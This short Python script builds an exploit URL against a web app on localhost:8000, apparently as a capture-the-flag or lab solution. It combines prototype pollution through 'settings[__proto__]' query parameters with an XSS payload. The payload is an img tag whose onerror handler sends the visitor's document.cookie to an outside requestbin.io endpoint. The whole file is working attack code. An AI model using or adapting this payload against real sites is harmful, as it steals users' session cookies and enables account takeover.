from urllib.parse import quote

url = "http://localhost:8000/"

xss = """<img src=x onerror="fetch('https://requestbin.io/10m73e41?c='+document.cookie)" />"""

payload =  "?settings[__proto__]=__proto__"
payload += "&settings[__proto__]=$$inject"
payload += "&settings[__proto__]=foo"
payload += "&settings[__proto__]={}".format(quote(xss))

full_payload = f"{url}{payload}"

print(full_payload)

